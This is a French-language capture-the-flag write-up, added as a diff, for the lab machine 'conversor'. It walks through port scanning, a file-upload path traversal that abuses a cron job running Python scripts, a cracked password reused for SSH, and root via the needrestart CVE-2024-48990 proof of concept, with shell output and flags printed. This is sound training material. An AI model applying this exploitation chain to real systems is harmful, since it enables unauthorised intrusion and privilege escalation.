@@ -1,0 +1,121 @@
+Nmap:
+nmap -p- -sV -A 10.10.11.92
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 06:46 EDT
+Nmap scan report for 10.10.11.92
+Host is up (0.021s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://conversor.htb/
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT      ADDRESS
+1   15.98 ms 10.10.14.1
+2   16.09 ms 10.10.11.92
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.70 seconds
+                                                                  
+En arrivant sur le serv web je tombes sur un formulaire qui utilise des fichiers XSLT et XML pour generer une page html (img: sc/form.jpg), je sais que les fichiers XML ET XSLT sont vulnérables a des injections pouvant mener a des LFI ou même RCE, je tombes sur cet article et tentes donc de tester la gestion du fichier XSLT https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html#include-external-xsl
+en rajoutant ces 3 lignes au fichier je vois que on est sur libxslt 1.0
+<xsl:value-of select="system-property('xsl:version')" />
+<xsl:value-of select="system-property('xsl:vendor')" />
+<xsl:value-of select="system-property('xsl:vendor-url')" />
+
+je découvres aussi une page "about" avec du code source
+dans le app.py
+        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+
+la différence entre le parsing du xml et du xslt laisse sous entendre une faille possible dans le xlst
+
+Au final Après BEAUUUUCOUP de temps passé sur ça, ça ne mène a rien
+
+dans les fichiers je tombe aussi sur cette ligne,
+
+You can also run it with Apache using the app.wsgi file.
+
+If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
+
+"""
+* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
+"""
+
+cela veut dire que si j'arrive a creer un scripte python dans le dossier il l'executera
+
+j'avais pas vu mais il enregistre physiquement les fichiers que j'upload en combinant des paths sans trop de verification.
+je peux donc surement arbitrairement mettre un fichier .py dans ../scripts
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+
+Je teste cette theorie en mettant dans le dossier /static et effectivement en ajoutant ../static au nom du fichier je peux choisir la path ou le fichier est enregistré
+effectivement ça fonctionne (img: sc/foothold.jpg) et effectivement ça fonctionne
+
+dans le dossier du site web il y a un fichier db, une fois téléchargé j'ai l'user fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
+et une fois déchiffré sur crackstation j'ai fismathack:Keepmesafeandwarm
+
+je peux ensuite me connecter en ssh a cause d'un password reuse et j'ai le flag user.txt dans le home
+
+fismathack@conversor:~$ sudo -l 
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+
+un cve assez recent existe https://github.com/makuga01/CVE-2024-48990-PoC
+
+We discovered three fundamental vulnerabilities in needrestart (three
+LPEs, Local Privilege Escalations, from any unprivileged user to full
+root), which are exploitable without user interaction on Ubuntu Server
+(through unattended-upgrades):
+
+- CVE-2024-48990: local attackers can execute arbitrary code as root by
+  tricking needrestart into running the Python interpreter with an
+  attacker-controlled PYTHONPATH environment variable.
+
+J'upload donc le poc sur le serveur, gcc n'est pas installé donc je cherche ce qui est installé et je remplace gcc par gcc-11 dans start.sh, je crée un fichier /tmp/poc sinon ça fonctionne pas
+Je lance le programme qui attends que needrestart reset, je vais donc dans un autre terminal et je lance "sudo needrestart" et ça fonctionne:
+`
+fismathack@conversor:/tmp/neirda/CVE-2024-48990-PoC$ sh start.sh 
+Error processing line 1 of /usr/lib/python3/dist-packages/zope.interface-5.4.0-nspkg.pth:
+
+  Traceback (most recent call last):
+    File "/usr/lib/python3.10/site.py", line 192, in addpackage
+      exec(line)
+    File "<string>", line 1, in <module>
+  ImportError: dynamic module does not define module export function (PyInit_importlib)
+
+Remainder of file ignored
+##########################################
+
+Don't mind the error message above
+
+Waiting for needrestart to run...
+Got the shell!
+# id
+uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)
+# cd /root
+# cat root.txt
+4f88dcd6f611772af47defa269654404
+# 
+`
+
+TERMINÉ !
+
+notes:
+Le challenge était classé comme vraiment vraiment facile et effectivement à partir du moment ou tu trouves la première faille (le rfi) tout deviens très simple, mais pourtant je suis resté bloqué plusieurs jours sur un cul-de-sac (les fichiers XML et XSLT), pourtant les indices étaient bien gros pour dire que la faille était autre part. Bref en gros il faut que je recherche d'autre moyens plus rapidement au lieu de rester bloqué trop longtemps sur un truc
